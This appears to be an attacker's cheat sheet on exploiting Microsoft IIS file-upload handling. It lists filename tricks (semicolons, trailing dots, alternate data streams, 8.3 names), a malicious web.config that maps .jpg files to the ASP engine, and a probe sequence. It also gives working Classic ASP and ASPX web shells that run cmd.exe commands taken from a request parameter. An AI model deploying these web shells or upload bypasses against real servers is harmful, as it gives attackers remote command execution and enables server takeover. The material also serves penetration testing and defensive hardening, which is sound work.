# IIS Deep — handlers, semicolons, ADS, and web.config

## The handler-map model

IIS maps `path`+`verb` → handler (`IsapiModule`, `StaticFile`,
`asp.dll`, `aspnet_isapi.dll`, `PHP_via_FastCGI`). Execution is per-ext
mapping — the tricks are (a) getting an exec ext past the check, (b)
making a safe ext exec, (c) finding name forms that split differently for
validator vs mapper.

## IIS6 semicolon — `shell.asp;.jpg`

IIS 6 parsed the URL path at the first `;` — `shell.asp;.jpg` maps as
`.asp` to asp.dll. Historic but CTF-emulated. Variants:

```
x.asp;.jpg        → maps asp
x.aspx;1.jpg      → maps aspx
x.asa;.jpg
x.cer;.jpg
/x.asp;/x.jpg     — semicolon INSIDE a segment vs between segments
```

## Trailing dot / space — Windows strips

Windows (NTFS+Win32 API) silently strips trailing dots and spaces:

```
x.asp.   → stored as x.asp  → executes; a check on "x.asp." may pass or
         reject by raw string — either way the file lands as .asp
x.asp    → stored as x.asp
x.asp\t
```

Same for `x.php.`/`x.php ` on IIS-hosted PHP.

## `:` — ADS and truncation

`file.jpg:shell.asp` — `:` introduces an alternate data stream; behaviors:

- `x.asp::$DATA` — writes the stream content; `x.asp` exists with payload
- `x.jpg:shell.asp` — creates `x.jpg` with an ADS named `shell.asp`; some
  IIS versions/handlers then execute `x.jpg`? Not directly — but some save
  paths truncate at `:` → `x.jpg` written, or `x` written
- `x.asp::$INDEX_ALLOCATION` — directory
- `x.asp:.jpg` — stream inside x.asp

Probe: upload `x.jpg:y` → the file that lands reveals the parser's split.

## `web.config` in an upload dir — the IIS config attack

Requires the feature unlocked in `applicationHost.config`:

```xml
<configuration>
  <system.webServer>
    <handlers>
      <add name="asp" path="*.jpg" verb="*" modules="IsapiModule"
           scriptProcessor="C:\Windows\System32\inetsrv\asp.dll"
           resourceType="Unspecified" requireAccess="Script"/>
    </handlers>
  </system.webServer>
</configuration>
```

`handlers` locked → `500.19`/`0x80070021` on any request to the dir —
that error proves web.config IS being read (a locked-feature error = the
file was honored enough to reject). Fallback with weaker rights:

```xml
<staticContent>
  <mimeMap fileExtension=".jpg" mimeType="text/html"/>
</staticContent>
```

`mimeMap` is often less-locked — makes `.jpg` serve `text/html` → stored
XSS delivery even without script exec.

Also `defaultDocument`, `httpRedirect`, `rewrite` rules, `security`/`ipSecurity`.

## ASP vs ASP.NET extension split — `.asp`/`.asa`/`.cer`/`.cdx`/`.aspx`

- `.asa` runs as asp (older mapping sometimes still on)
- `.cer`/`.cdx` — ASP security certificate/channel exts mapped to asp.dll
- `.aspx` → `aspnet_isapi` — different engine
- `.ashx` — generic handler — ASP.NET HTTP handler — often forgotten in
  blacklists
- `.asmx` — SOAP service — executes ASP.NET code
- `.soap` — SOAP mapping
- `.config` — if you can upload `web.config` INTO a path that reads it
- `.cs`/`.vb` — code-beside files — compiled on next app build, not live
- `.shtm/.shtml` — server-side includes if `ssinc.dll` mapped:
  `<!--#exec cmd="..."-->` — SSI exec

## Classic ASP shell forms

```asp
<% eval request("c") %>
<% response.write createobject("wscript.shell").exec("cmd /c "&request("c")).stdout.readall %>
<% server.execute "/x.asp" %>            <%-- SSI-style --%>
```

ASPX shell:

```aspx
<%@ Page Language="C#" %>
<% var p = new System.Diagnostics.Process();
   p.StartInfo = new System.Diagnostics.ProcessStartInfo("cmd.exe","/c "+Request["c"]){RedirectStandardOutput=true,UseShellExecute=false};
   p.Start(); Response.Write(p.StandardOutput.ReadToEnd()); %>
```

## IIS + PHP — FastCGI PHP behind IIS

Same exec-ext families as Apache; `.user.ini` doesn't apply (not FPM-ini);
the handler map for `.php*` lives in applicationHost — extension whitelist
tricks apply: `.php` alternates `.php3`.../`phtml` only if MAPPED — check
which exts map to PHP via probing each ext's exec.

## Path and case — Windows-specific

- paths case-insensitive — `X.ASP` = `x.asp` — case always executes; the
  check's case-sensitivity is the only question
- `/` and `\` both accepted — `x.asp/..\\y.jpg` mixes
- `~` 8.3 short names — `LONGFI~1.ASP` — legacy name access
- `%u` unicode escapes — `%u0041` decoders
- reserved device names — `CON`, `PRN`, `AUX`, `NUL`, `COM1-9`, `LPT1-9` —
  `x.asp:CON`? write to `con.php` fails on Windows — a reject may mean the
  name is reserved not blocked — rename and retry

## Probe sequence

```
1. fetch /uploads/x.asp → exec or static?
2. x.asp;.jpg / x.aspx;1.jpg → semicolon map?
3. x.jpg:y / x.asp::$DATA → ADS landing?
4. trailing dot/space → strips to exec ext?
5. web.config upload → mimeMap text/html? handlers?
6. .ashx/.asmx/.soap → forgotten exec exts?
7. 8.3 short names → ~1 forms reachable?
```

## Falsifiers

- the site is ASP.NET-only with no writeable handler path, web.config
  locked, all semicolon/ADS forms rejected
- upload dir is `StaticFile`-mapped only, no handler upload accepted

## Output to record

- the name-form that mapped to an exec handler + verbatim output
